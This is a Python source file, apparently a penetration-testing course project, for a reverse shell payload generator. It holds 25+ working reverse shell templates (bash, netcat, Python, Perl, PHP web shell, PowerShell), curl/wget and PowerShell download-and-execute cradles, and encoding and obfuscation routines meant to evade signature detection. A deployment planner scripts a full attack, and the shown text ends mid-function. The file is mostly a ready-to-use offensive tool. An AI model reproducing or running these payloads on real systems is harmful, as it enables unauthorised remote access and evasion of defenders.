#!/usr/bin/env python3
"""
shellgen.py — Advanced Shell Payload Generator & Deployment Planner
====================================================================
Module 01 · Module 1 · Project 5
Authorized lab / CTF / penetration testing environments only.

An engineer-grade payload generator designed to teach the full lifecycle
of a reverse shell attack — from payload construction through deployment
and post-exploitation stabilisation.

What makes this different from a basic payload list:

  TEMPLATE ENGINE
    25+ payload templates across 12 languages/environments, stored as
    typed PayloadTemplate objects with metadata: platform, encoding
    compatibility, stealth score (1-10), and technique description.
    Templates use {LHOST}/{LPORT} placeholders rendered at runtime.

  ENCODING ENGINE
    Four encoding modes:
      plain    — raw command, copy-paste ready
      b64      — base64-wrapped, bypasses simple quote/special-char filters
      url      — percent-encoded for HTTP parameter injection contexts
      ps_enc   — PowerShell -EncodedCommand (UTF-16LE + base64), the
                 standard way to pass complex PS one-liners without quoting

  OBFUSCATION ENGINE
    Variable name randomisation for bash/python payloads.  String
    concatenation splitting breaks static signatures that match on the
    complete command string.

  OPSEC ANALYSER
    Each template carries a stealth_score (1=loud, 10=quiet) and a list
    of OPSEC notes explaining *why* each technique is noisy or stealthy.
    These notes mirror what a real detection engineer would write in a
    Sigma / Suricata rule.

  DEPLOYMENT PLANNER
    Given a target platform and payload type, generates a complete
    four-step attack plan:
      Step 1 — Start the listener (nc / socat / python handler)
      Step 2 — Host the payload via HTTP (python3 -m http.server)
      Step 3 — Execute on target (curl/wget one-liner)
      Step 4 — Stabilise the shell (PTY upgrade sequence)

  LISTENER MODE
    --listen spawns a raw Python TCP listener directly in the terminal
    so you can test payloads without installing netcat.

  MULTI-FORMAT OUTPUT
    table     — coloured summary of all matching templates
    single    — one payload with full OPSEC notes
    cheatsheet — all payloads for the given LHOST:LPORT, formatted for
                 quick reference during an engagement

Author : Kuldeep Singh
Lab    : 192.168.100.0/24 | Kali .10 | Webserver .30
"""

from __future__ import annotations

import argparse
import base64
import os
import random
import socket
import string
import sys
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional


# ─────────────────────────────────────────────────────────────────────────────
# ANSI color helpers
# ─────────────────────────────────────────────────────────────────────────────

_USE_COLOR = sys.stdout.isatty()


def _c(code: str, text: str) -> str:
    """Wrap *text* in an ANSI escape code if color output is active."""
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text


def green(t: str)   -> str: return _c("32;1", t)
def yellow(t: str)  -> str: return _c("33",   t)
def cyan(t: str)    -> str: return _c("36",   t)
def red(t: str)     -> str: return _c("31;1", t)
def blue(t: str)    -> str: return _c("34",   t)
def magenta(t: str) -> str: return _c("35",   t)
def grey(t: str)    -> str: return _c("90",   t)
def bold(t: str)    -> str: return _c("1",    t)
def dim(t: str)     -> str: return _c("2",    t)


# ─────────────────────────────────────────────────────────────────────────────
# Core data model
# ─────────────────────────────────────────────────────────────────────────────

@dataclass(frozen=True)
class PayloadTemplate:
    """
    Immutable descriptor for a single reverse shell payload technique.

    Using a frozen dataclass enforces that the template database is read-only
    at runtime — templates are defined once and never mutated.

    Attributes:
        name           Short identifier used on the CLI (e.g. 'bash-tcp')
        language       Runtime required (e.g. 'bash', 'python3', 'powershell')
        platform       Target OS: 'linux', 'windows', or 'any'
        template       Command string with {LHOST} and {LPORT} placeholders
        description    One-sentence explanation of the technique
        stealth_score  1 (very loud) to 10 (very quiet) OPSEC rating
        opsec_notes    List of detection / evasion notes for this technique
        encodable      Encoding modes this payload is compatible with
        requires_root  True if the payload needs elevated privileges on target
    """
    name: str
    language: str
    platform: str
    template: str
    description: str
    stealth_score: int
    opsec_notes: list[str]
    encodable: list[str]          # ['plain', 'b64', 'url', 'ps_enc']
    requires_root: bool = False


@dataclass
class RenderedPayload:
    """
    A PayloadTemplate rendered with specific LHOST/LPORT values and encoding.

    Attributes:
        template       The source PayloadTemplate
        lhost          Listener IP used for rendering
        lport          Listener port used for rendering
        encoding       Encoding mode applied ('plain', 'b64', 'url', 'ps_enc')
        command        The final rendered command string
        obfuscated     True if obfuscation was applied
    """
    template: PayloadTemplate
    lhost: str
    lport: int
    encoding: str
    command: str
    obfuscated: bool = False


# ─────────────────────────────────────────────────────────────────────────────
# Payload template database — 25+ techniques
# ─────────────────────────────────────────────────────────────────────────────

# Stealth score rubric:
#   1-3  : Very detectable — spawns known process names, uses clear-text
#           /dev/tcp, or matches trivial AV signatures
#   4-6  : Moderately detectable — common but requires a rule to catch
#   7-9  : Quiet — uses unusual methods, standard binaries, or encryption
#   10   : Near-silent — lives entirely in memory, uses only built-in OS calls

PAYLOAD_DB: list[PayloadTemplate] = [

    # ── BASH ──────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="bash-tcp",
        language="bash",
        platform="linux",
        template="bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        description="Classic bash /dev/tcp redirect — simplest and most common",
        stealth_score=2,
        opsec_notes=[
            "Spawns 'bash -i' which is logged by most EDR products",
            "'/dev/tcp' string matches hundreds of AV and SIEM signatures",
            "Process tree: parent → bash -i (highly suspicious)",
            "Use ONLY in noisy lab environments or as a last resort",
        ],
        encodable=["plain", "b64", "url"],
    ),

    PayloadTemplate(
        name="bash-udp",
        language="bash",
        platform="linux",
        template="bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
        description="Bash UDP variant — bypasses TCP-only firewall egress rules",
        stealth_score=4,
        opsec_notes=[
            "UDP is less monitored than TCP at many network boundaries",
            "Listener must support UDP (nc -u -lvnp {LPORT})",
            "Still spawns 'bash -i' — process-level detection applies",
            "Useful when TCP egress is blocked but UDP is permitted",
        ],
        encodable=["plain", "b64"],
    ),

    PayloadTemplate(
        name="bash-fifo",
        language="bash",
        platform="linux",
        template=(
            "rm -f /tmp/.p; mkfifo /tmp/.p; "
            "cat /tmp/.p | bash -i 2>&1 | nc {LHOST} {LPORT} > /tmp/.p"
        ),
        description="Named pipe (FIFO) shell — avoids /dev/tcp, uses standard nc",
        stealth_score=5,
        opsec_notes=[
            "Does not use /dev/tcp — evades rules that match that string",
            "FIFO file left on disk (/tmp/.p) — clean up with rm after use",
            "nc process is visible in 'ps aux' from defender side",
            "Write FIFO to a more obscure path (e.g. /tmp/.<random>) for stealth",
        ],
        encodable=["plain", "b64"],
    ),

    PayloadTemplate(
        name="bash-b64-exec",
        language="bash",
        platform="linux",
        template="echo {B64_PAYLOAD} | base64 -d | bash",
        description="Base64 self-decoding stub — wraps 'bash-tcp' to obscure the payload string",
        stealth_score=4,
        opsec_notes=[
            "Breaks static string matching on '/dev/tcp' and 'bash -i'",
            "Does NOT break behaviour-based detection (still spawns bash)",
            "The b64 blob itself is now the indicator — defenders will decode it",
            "Best combined with a second encoding layer in a constrained context",
        ],
        encodable=["plain"],
    ),

    # ── PYTHON ────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="python3-socket",
        language="python3",
        platform="any",
        template=(
            "python3 -c 'import socket,os,pty;"
            "s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));"
            "[os.dup2(s.fileno(),f) for f in(0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        ),
        description="Python3 socket + pty.spawn — gives a proper PTY, not a dumb shell",
        stealth_score=5,
        opsec_notes=[
            "pty.spawn allocates a real pseudo-terminal — interactive commands work",
            "python3 process is visible but less alarming than 'bash -i'",
            "Payload is a one-liner — easy to pass via command injection",
            "Can be base64-encoded: python3 -c \"exec(__import__('base64').b64decode(...)\")",
        ],
        encodable=["plain", "b64", "url"],
    ),

    PayloadTemplate(
        name="python3-subprocess",
        language="python3",
        platform="any",
        template=(
            "python3 -c '"
            "import socket,subprocess,os;"
            "s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/bash\",\"-i\"])'"
        ),
        description="Python3 subprocess variant — explicit stdin/stdout/stderr redirect",
        stealth_score=5,
        opsec_notes=[
            "subprocess.call leaves a child process entry in /proc",
            "More verbose than socket+pty but behaves identically on the wire",
            "Good when pty module is unavailable (stripped Python builds)",
        ],
        encodable=["plain", "b64"],
    ),

    PayloadTemplate(
        name="python3-b64exec",
        language="python3",
        platform="any",
        template=(
            "python3 -c \"exec(__import__('base64').b64decode"
            "('{B64_INNER}').decode())\""
        ),
        description="Python3 exec(base64.decode()) wrapper — hides inner payload",
        stealth_score=6,
        opsec_notes=[
            "Inner payload is entirely hidden from static analysis",
            "Behaviour-based EDR will still flag the dup2/socket calls at runtime",
            "Can be chained: outer b64 wraps an obfuscated inner payload",
        ],
        encodable=["plain"],
    ),

    # ── PERL ──────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="perl-socket",
        language="perl",
        platform="linux",
        template=(
            "perl -e 'use Socket;"
            "$i=\"{LHOST}\";$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/bash -i\");'"
        ),
        description="Perl socket shell — useful when Python is absent but Perl is installed",
        stealth_score=5,
        opsec_notes=[
            "Perl is present on most older Linux systems (often missing on containers)",
            "Process name 'perl -e' is somewhat less suspicious than 'bash -i'",
            "exec() replaces the perl process, so only 'bash -i' remains in ps",
        ],
        encodable=["plain", "url"],
    ),

    # ── RUBY ──────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="ruby-socket",
        language="ruby",
        platform="any",
        template=(
            "ruby -rsocket -e '"
            "exit if fork;"
            "c=TCPSocket.new(\"{LHOST}\",{LPORT});"
            "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        ),
        description="Ruby socket shell with fork() — daemonises itself so parent exits cleanly",
        stealth_score=6,
        opsec_notes=[
            "fork() + exit() detaches from the parent process — evades some job monitoring",
            "Child process runs as the same user with no TTY allocation",
            "IO.popen executes each received line as a shell command (interactive)",
            "Ruby is common on web servers running Rails/Sinatra apps",
        ],
        encodable=["plain"],
    ),

    # ── PHP ───────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="php-proc-open",
        language="php",
        platform="linux",
        template=(
            "php -r '"
            "$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "$proc=proc_open(\"/bin/bash -i\","
            "[0=>$sock,1=>$sock,2=>$sock],$pipes);'"
        ),
        description="PHP proc_open shell — typically delivered via web file upload or LFI",
        stealth_score=3,
        opsec_notes=[
            "proc_open('/bin/bash') is a tier-1 detection rule in every WAF/EDR",
            "Runs as the web server user (www-data) — typically low privilege",
            "WAFs with PHP inspection will catch 'fsockopen' + 'proc_open' together",
            "Best delivered as a web shell file (<?php ...>) not a CLI one-liner",
        ],
        encodable=["plain", "url"],
    ),

    PayloadTemplate(
        name="php-web-shell",
        language="php",
        platform="linux",
        template="<?php system($_GET['cmd']); ?>",
        description="Minimal PHP web shell — serves as a command execution stepping stone",
        stealth_score=2,
        opsec_notes=[
            "Trivially detected by any PHP web shell scanner (r57, c99 signatures)",
            "system() is blacklisted in many php.ini configurations (disable_functions)",
            "Access logs will show ?cmd=<command> in plain text",
            "Upload to /var/www/html/ then: curl http://target/shell.php?cmd=id",
        ],
        encodable=["plain"],
    ),

    # ── NETCAT VARIANTS ───────────────────────────────────────────────────────

    PayloadTemplate(
        name="nc-traditional",
        language="netcat",
        platform="linux",
        template="nc -e /bin/bash {LHOST} {LPORT}",
        description="Traditional netcat with -e flag (GNU/traditional nc only)",
        stealth_score=3,
        opsec_notes=[
            "-e flag is disabled in OpenBSD nc (most modern distros) — use nc-fifo instead",
            "'nc -e /bin/bash' is one of the most widely signatured payloads",
            "Process name 'nc' is always suspicious in IDS rules",
            "Confirm nc version: nc --version | grep -i 'open' means no -e support",
        ],
        encodable=["plain"],
    ),

    PayloadTemplate(
        name="nc-openbsd",
        language="netcat",
        platform="linux",
        template=(
            "rm -f /tmp/.f; mkfifo /tmp/.f; "
            "nc {LHOST} {LPORT} < /tmp/.f | /bin/bash > /tmp/.f 2>&1; "
            "rm -f /tmp/.f"
        ),
        description="OpenBSD nc (no -e) workaround using named pipe — works on Ubuntu/Kali default nc",
        stealth_score=4,
        opsec_notes=[
            "Works with OpenBSD nc (ncat, netcat-openbsd packages)",
            "FIFO written to /tmp — change path for stealth",
            "Cleans up after itself (rm at end) — reduces forensic artifact",
            "Shell output goes through the FIFO, providing interactive capability",
        ],
        encodable=["plain"],
    ),

    PayloadTemplate(
        name="ncat-ssl",
        language="netcat",
        platform="linux",
        template="ncat --ssl {LHOST} {LPORT} -e /bin/bash",
        description="ncat with SSL encryption — C2 traffic blends in with TLS",
        stealth_score=7,
        opsec_notes=[
            "Traffic is TLS-encrypted — network IDS cannot inspect payload",
            "Listener must also use ncat --ssl -lvnp {LPORT}",
            "TLS certificate is self-signed — certificate anomaly may trigger alert",
            "Traffic profile looks like an HTTPS connection to a non-443 port",
        ],
        encodable=["plain"],
    ),

    # ── SOCAT ─────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="socat-tty",
        language="socat",
        platform="linux",
        template=(
            "socat exec:'bash -li',"
            "pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}"
        ),
        description="socat PTY shell — best interactive shell without a full reverse shell framework",
        stealth_score=6,
        opsec_notes=[
            "Allocates a real PTY (pty option) — ctrl-c/tab completion work natively",
            "No need for PTY upgrade commands post-exploitation",
            "socat not installed by default — check: which socat",
            "Listener: socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}",
        ],
        encodable=["plain"],
    ),

    PayloadTemplate(
        name="socat-ssl",
        language="socat",
        platform="linux",
        template=(
            "socat openssl:{LHOST}:{LPORT},verify=0 "
            "exec:bash,pty,stderr,setsid"
        ),
        description="socat SSL-encrypted PTY shell — encrypted channel + full TTY",
        stealth_score=8,
        opsec_notes=[
            "Combines TLS encryption with a real PTY — very capable and quiet",
            "verify=0 accepts self-signed certs — no PKI infrastructure needed",
            "Listener: socat openssl-listen:{LPORT},cert=server.pem,verify=0 file:`tty`,raw,echo=0",
            "Generate cert: openssl req -newkey rsa:2048 -nodes -keyout server.pem -x509 -days 7 -out server.pem",
        ],
        encodable=["plain"],
    ),

    # ── POWERSHELL (WINDOWS) ─────────────────────────────────────────────────

    PayloadTemplate(
        name="ps-socket",
        language="powershell",
        platform="windows",
        template=(
            "$c=New-Object Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$rb=[Text.Encoding]::ASCII.GetBytes($r+\"PS> \");"
            "$s.Write($rb,0,$rb.Length)}}"
        ),
        description="PowerShell TCP socket shell — native Windows, no extra tools",
        stealth_score=4,
        opsec_notes=[
            "PowerShell script block logging (Event ID 4104) captures this verbatim",
            "Net.Sockets.TCPClient is commonly signatured in Defender/CrowdStrike",
            "iex (Invoke-Expression) is a tier-1 PowerShell detection",
            "Use ps_enc encoding to pass as -EncodedCommand and break static rules",
        ],
        encodable=["plain", "ps_enc"],
    ),

    PayloadTemplate(
        name="ps-download-exec",
        language="powershell",
        platform="windows",
        template=(
            "powershell -nop -w hidden -c "
            "\"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{LPORT}/shell.ps1')\""
        ),
        description="PowerShell download-cradle — fetches and executes a hosted PS script",
        stealth_score=4,
        opsec_notes=[
            "Net.WebClient.DownloadString + IEX is the most common PS download pattern",
            "Requires hosting a shell.ps1 on an HTTP server (python3 -m http.server)",
            "HTTP request will appear in proxy/firewall logs to {LHOST}",
            "Use with ps_enc encoding to hide the cradle URL from casual inspection",
        ],
        encodable=["plain", "ps_enc"],
    ),

    # ── AWK / GAWK ────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="awk-shell",
        language="awk",
        platform="linux",
        template=(
            "awk 'BEGIN {{s=\"/inet/tcp/0/{LHOST}/{LPORT}\";"
            "while(42){{do{{printf \"shell> \" |& s;s |& getline c;"
            "while((c |& getline)>0)print|&s;close(c)}}while(c!=\"exit\")}}}}'"
        ),
        description="awk /inet/tcp shell — uses gawk's network extension, no nc/python needed",
        stealth_score=7,
        opsec_notes=[
            "Uses gawk's built-in /inet/tcp — no network tools needed on target",
            "awk process name is almost never signatured as malicious",
            "Requires GNU awk (gawk), not mawk (check: awk --version)",
            "Shell is limited (no PTY) but useful in heavily restricted environments",
        ],
        encodable=["plain"],
    ),

    # ── LUA ───────────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="lua-socket",
        language="lua",
        platform="linux",
        template=(
            "lua -e \"require('socket');"
            "t=socket.tcp();"
            "t:connect('{LHOST}',{LPORT});"
            "while true do local r,s=t:receive('*l');"
            "local f=io.popen(r,'r');"
            "local d=f:read('*a');t:send(d) end\""
        ),
        description="Lua socket shell — useful on IoT devices, routers, and game servers",
        stealth_score=7,
        opsec_notes=[
            "Lua is common on OpenWRT routers, Redis (embedded Lua), and game engines",
            "luasocket library must be installed: luarocks install luasocket",
            "Very few IDS signatures exist for Lua-based network shells",
        ],
        encodable=["plain"],
    ),

    # ── NODE.JS ───────────────────────────────────────────────────────────────

    PayloadTemplate(
        name="node-shell",
        language="node",
        platform="any",
        template=(
            "node -e \""
            "var n=require('net'),"
            "s=new n.Socket();"
            "s.connect({LPORT},'{LHOST}',function(){{"
            "require('child_process').spawn('/bin/bash',"
            "['-i'],{{stdio:[s,s,s]}})}})\""
        ),
        description="Node.js net + child_process shell — common on JS/TS web app servers",
        stealth_score=6,
        opsec_notes=[
            "Node.js is present on any server running Express/Next.js/NestJS",
            "child_process.spawn is monitored by modern EDR on node processes",
            "One-liner can be delivered via SSRF or prototype pollution vulnerabilities",
            "Disguise as a debugging snippet to reduce suspicion",
        ],
        encodable=["plain"],
    ),

    # ── CURL-BASED STAGED DELIVERY ────────────────────────────────────────────

    PayloadTemplate(
        name="curl-staged",
        language="bash",
        platform="linux",
        template="curl -fsSL http://{LHOST}:{LPORT}/shell.sh | bash",
        description="Staged curl delivery — fetches and pipes a shell script directly",
        stealth_score=3,
        opsec_notes=[
            "curl | bash is heavily signatured — monitors HTTP + pipe-to-bash pattern",
            "Entire payload resides on the listener server (smaller disk footprint on target)",
            "The HTTP request to {LHOST}:{LPORT} is visible in proxy/FW logs",
            "Use with a redirector/CDN to distance the C2 from the listener",
        ],
        encodable=["plain"],
    ),

    PayloadTemplate(
        name="wget-staged",
        language="bash",
        platform="linux",
        template="wget -qO- http://{LHOST}:{LPORT}/shell.sh | bash",
        description="Staged wget delivery — wget alternative when curl is unavailable",
        stealth_score=3,
        opsec_notes=[
            "wget is often present when curl is not (older Debian/Ubuntu systems)",
            "-qO- suppresses progress bar and pipes to stdout silently",
            "Same HTTP-to-bash detection as curl-staged",
        ],
        encodable=["plain"],
    ),

    # ── XTERM DISPLAY FORWARD ─────────────────────────────────────────────────

    PayloadTemplate(
        name="xterm-display",
        language="xterm",
        platform="linux",
        template="xterm -display {LHOST}:0",
        description="xterm display forward — sends an X11 window to attacker's display",
        stealth_score=5,
        opsec_notes=[
            "Requires attacker to run: Xnest :0 and xhost +{TARGET_IP}",
            "Creates a visible X11 window — useless against headless servers",
            "Useful for thick-client pivoting where the server has a display",
            "X11 traffic is unencrypted — visible on network captures",
        ],
        encodable=["plain"],
    ),
]

# Quick lookup by name
_TEMPLATE_MAP: dict[str, PayloadTemplate] = {t.name: t for t in PAYLOAD_DB}


# ─────────────────────────────────────────────────────────────────────────────
# Encoding engine
# ─────────────────────────────────────────────────────────────────────────────

class EncodingEngine:
    """
    Applies encoding transformations to rendered payload strings.

    Supported modes:
        plain    No transformation — returns the command as-is
        b64      Wraps with: echo <base64> | base64 -d | bash
                 Useful when the injection context rejects special chars
        url      Percent-encodes every character except unreserved ones
                 Useful for HTTP parameter injection vectors
        ps_enc   PowerShell -EncodedCommand: UTF-16LE encodes the string,
                 then base64's it — the standard way to pass complex PS
                 commands without shell quoting issues
    """

    @staticmethod
    def encode(command: str, mode: str) -> str:
        """
        Apply the specified encoding to a command string.

        Args:
            command : Raw rendered payload command
            mode    : Encoding mode ('plain', 'b64', 'url', 'ps_enc')

        Returns:
            Encoded command string ready for use.

        Raises:
            ValueError if an unknown mode is specified.
        """
        if mode == "plain":
            return command
        if mode == "b64":
            return EncodingEngine._encode_b64(command)
        if mode == "url":
            return urllib.parse.quote(command, safe="")
        if mode == "ps_enc":
            return EncodingEngine._encode_ps(command)
        raise ValueError(f"Unknown encoding mode: {mode!r}")

    @staticmethod
    def _encode_b64(command: str) -> str:
        """
        Base64-encode a command and wrap in a self-decoding bash stub.

        The resulting command can be pasted anywhere bash is available and
        will decode and execute itself.

        Args:
            command : Raw shell command to encode

        Returns:
            String: echo <b64> | base64 -d | bash
        """
        b64 = base64.b64encode(command.encode()).decode()
        return f"echo {b64} | base64 -d | bash"

    @staticmethod
    def _encode_ps(command: str) -> str:
        """
        Produce a PowerShell -EncodedCommand invocation.

        PowerShell's -EncodedCommand flag expects a UTF-16LE string that
        has been base64-encoded.  This is the standard technique for
        passing complex PS one-liners via cmd.exe without quote escaping.

        Args:
            command : PowerShell command string to encode

        Returns:
            String: powershell.exe -NonInteractive -WindowStyle Hidden
                    -EncodedCommand <base64>
        """
        utf16 = command.encode("utf-16-le")
        b64   = base64.b64encode(utf16).decode()
        return f"powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {b64}"


# ─────────────────────────────────────────────────────────────────────────────
# Obfuscation engine
# ─────────────────────────────────────────────────────────────────────────────

class ObfuscationEngine:
    """
    Applies light syntactic obfuscation to bash and python payloads.

    The goal is to break static string-based detection (YARA rules, grep)
    without changing runtime behaviour.  This is intentionally simple —
    it illustrates the concept without implementing actual AV evasion.

    Techniques:
        Variable renaming    Replace known variable names with random names
        String splitting     Split the /dev/tcp path across a variable so
                             the complete string never appears in plaintext
    """

    @staticmethod
    def _rand_var(prefix: str = "v") -> str:
        """
        Generate a random variable name.

        Args:
            prefix : Prefix character(s) for the variable name

        Returns:
            String like 'vXkqP' (5-8 random alphanumeric characters)
        """
        suffix = "".join(random.choices(string.ascii_letters, k=random.randint(4, 7)))
        return f"{prefix}{suffix}"

    @staticmethod
    def obfuscate_bash(command: str, lhost: str, lport: int) -> str:
        """
        Apply variable-renaming obfuscation to a bash payload.

        Replaces the literal LHOST and LPORT values with randomly named
        variables, and splits the /dev/tcp path across two variables so
        the complete signature string is not present.

        Args:
            command : Rendered bash payload string
            lhost   : Listener IP (to locate and replace)
            lport   : Listener port (to locate and replace)

        Returns:
            Obfuscated bash command as a one-liner with variable declarations.
        """
        host_var  = ObfuscationEngine._rand_var("h")
        port_var  = ObfuscationEngine._rand_var("p")
        part1_var = ObfuscationEngine._rand_var("a")
        part2_var = ObfuscationEngine._rand_var("b")

        # Split host to avoid complete IP string in plaintext
        host_parts = lhost.split(".")
        mid = len(host_parts) // 2
        part1 = ".".join(host_parts[:mid])
        part2 = ".".join(host_parts[mid:])

        header = (
            f"{part1_var}={part1!r}; "
            f"{part2_var}={part2!r}; "
            f"{host_var}=\"${{{part1_var}}}.${{{part2_var}}}\"; "
            f"{port_var}={lport}; "
        )
        # Replace literal LHOST/LPORT in the command with variable references
        obfuscated = command.replace(lhost, f"${{{host_var}}}")
        obfuscated = obfuscated.replace(str(lport), f"${{{port_var}}}")
        return header + obfuscated

    @staticmethod
    def obfuscate_python(command: str, lhost: str, lport: int) -> str:
        """
        Apply string-concatenation obfuscation to a Python one-liner.

        Replaces the literal LHOST string with a concatenation expression
        so that the complete IP address does not appear as a single token.

        Args:
            command : Rendered python payload string
            lhost   : Listener IP address string
            lport   : Listener port (not split — less commonly signatured)

        Returns:
            Obfuscated Python command string.
        """
        # Split IP into two halves and join with a concat expression
        parts = lhost.split(".")
        mid   = len(parts) // 2
        a     = ".".join(parts[:mid])
        b     = ".".join(parts[mid:])
        concat_expr = f"'{a}.'+ '{b}'"
        return command.replace(f'"{lhost}"', concat_expr).replace(f"'{lhost}'", concat_expr)


# ─────────────────────────────────────────────────────────────────────────────
# Payload rendering engine
# ─────────────────────────────────────────────────────────────────────────────

class PayloadEngine:
    """
    Renders PayloadTemplates into complete, ready-to-use commands.

    Combines template substitution, encoding, and optional obfuscation
    into a single render() call.

    Args:
        lhost  : Listener IP address
        lport  : Listener port number
    """

    def __init__(self, lhost: str, lport: int) -> None:
        """
        Initialise the engine with connection parameters.

        Args:
            lhost : Attacker/listener IP address
            lport : TCP listener port number
        """
        self.lhost = lhost
        self.lport = lport

    def render(
        self,
        template: PayloadTemplate,
        encoding: str = "plain",
        obfuscate: bool = False,
    ) -> RenderedPayload:
        """
        Render a PayloadTemplate into a complete command string.

        Substitutes {LHOST}/{LPORT} placeholders, optionally obfuscates,
        then applies the requested encoding.

        Args:
            template  : PayloadTemplate to render
            encoding  : Encoding mode ('plain', 'b64', 'url', 'ps_enc')
            obfuscate : Apply obfuscation before encoding if True

        Returns:
            RenderedPayload with the final command string set.

        Raises:
            ValueError if the requested encoding is not supported by this template.
        """
        if encoding not in template.encodable:
            raise ValueError(
                f"Template '{template.name}' does not support encoding '{encoding}'. "
                f"Supported: {template.encodable}"
            )

        # Step 1 — Basic substitution
        command = template.template.replace("{LHOST}", self.lhost)
        command = command.replace("{LPORT}", str(self.lport))

        # Step 2 — Handle special b64_inner placeholder (for wrapper templates)
        if "{B64_INNER}" in command or "{B64_PAYLOAD}" in command:
            inner = self._get_inner_b64()
            command = command.replace("{B64_INNER}", inner)
            command = command.replace("{B64_PAYLOAD}", inner)

        # Step 3 — Obfuscation (before encoding so the obfuscation is encoded too)
        was_obfuscated = False
        if obfuscate and encoding == "plain":
            if template.language == "bash":
                command = ObfuscationEngine.obfuscate_bash(command, self.lhost, self.lport)
                was_obfuscated = True
            elif template.language in ("python3", "python2"):
                command = ObfuscationEngine.obfuscate_python(command, self.lhost, self.lport)
                was_obfuscated = True

        # Step 4 — Encoding
        command = EncodingEngine.encode(command, encoding)

        return RenderedPayload(
            template=template,
            lhost=self.lhost,
            lport=self.lport,
            encoding=encoding,
            command=command,
            obfuscated=was_obfuscated,
        )

    def _get_inner_b64(self) -> str:
        """
        Generate the base64-encoded inner payload for wrapper templates.

        Returns the b64 of 'bash-tcp' (the simplest direct payload) to use
        as the inner payload for templates like 'bash-b64-exec'.

        Returns:
            Base64-encoded bash-tcp payload string.
        """
        inner = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        return base64.b64encode(inner.encode()).decode()


# ─────────────────────────────────────────────────────────────────────────────
# Deployment planner
# ─────────────────────────────────────────────────────────────────────────────

# PTY upgrade sequence — essential for interactive use after getting a dumb shell
PTY_UPGRADE_STEPS = [
    ("On target — spawn PTY",         "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
    ("On target — background shell",  "CTRL+Z"),
    ("On attacker — fix terminal",    "stty raw -echo; fg"),
    ("On target — set TERM/rows/cols","export TERM=xterm; stty rows 50 cols 220"),
]


class DeploymentPlanner:
    """
    Generates a complete step-by-step attack deployment plan.

    Given a rendered payload and platform information, produces the full
    sequence of commands needed to:
        1. Start the listener
        2. Host the payload file via HTTP
        3. Trigger execution on the target
        4. Upgrade to a stable PTY

    This mirrors the workflow a real operator follows on an engagement.

    Args:
        engine : PayloadEngine instance (provides lhost/lport)
    """

    def __init__(self, engine: PayloadEngine) -> None:
        """
        Initialise the planner.

        Args:
            engine : PayloadEngine with lhost/lport configured
        """
        self._lhost = engine.lhost
        self._lport = engine.lport

    def plan(self, rendered: RenderedPayload) -> str:
        """
        Build a formatted deployment plan for a rendered payload.

        Args:
            rendered : RenderedPayload to build the plan around

        Returns:
            Multi-line string with numbered steps and commands.
        """
        t = rendered.template
        lines: list[str] = []

        lines.append(bold(cyan(f"\n  ╔══ DEPLOYMENT PLAN — {t.name} ({'LINUX' if t.platform == 'linux' else t.platform.upper()}) {'═' * 20}")))

        # Step 1: Listener
        listener_cmd = self._listener_cmd(t)
        lines.append(green("\n  STEP 1 — Start listener on attacker machine (Kali)"))
        lines.append(f"  {bold(listener_cmd)}")

        # Step 2: Host payload
        lines.append(green("\n  STEP 2 — Host payload via HTTP"))
        lines.append(f"  {bold(f'python3 -m http.server {self._lport + 1} --directory /tmp')}")
        lines.append(grey(f"  # Copy payload to /tmp/shell.sh first:"))
        payload_content = rendered.command if t.language == "bash" else f"bash -i >& /dev/tcp/{self._lhost}/{self._lport} 0>&1"
        lines.append(f"  echo '{payload_content}' > /tmp/shell.sh && chmod +x /tmp/shell.sh")

        # Step 3: Execute on target
        lines.append(green("\n  STEP 3 — Execute on target"))
        delivery_cmd = self._delivery_cmd(t)
        lines.append(f"  {bold(delivery_cmd)}")
        lines.append(grey("  # Or paste the payload directly into a command injection vector"))

        # Step 4: PTY upgrade
        lines.append(green("\n  STEP 4 — Stabilise shell (run on target after connection)"))
        for label, cmd in PTY_UPGRADE_STEPS:
            lines.append(f"  {grey(label + ':')}  {bold(cmd)}")

        lines.append(bold(cyan(f"\n  ╚{'═' * 60}")))
        return "\n".join(lines)

    def _listener_cmd(self, t: PayloadTemplate) -> str:
        """
        Generate the appropriate listener command for a given template.

        Args:
            t : PayloadTemplate to generate the listener command for

        Returns:
            String command to start the listener.
        """
        if t.name == "ncat-ssl":
            return f"ncat --ssl -lvnp {self._lport}"
        if t.name == "socat-tty":
            return f"socat file:`tty`,raw,echo=0 tcp-listen:{self._lport},reuseaddr"
        if t.name == "socat-ssl":
            return (f"openssl req -newkey rsa:2048 -nodes -keyout /tmp/srv.pem -x509 -days 7 "
                    f"-out /tmp/srv.pem -subj '/CN=srv' 2>/dev/null && "
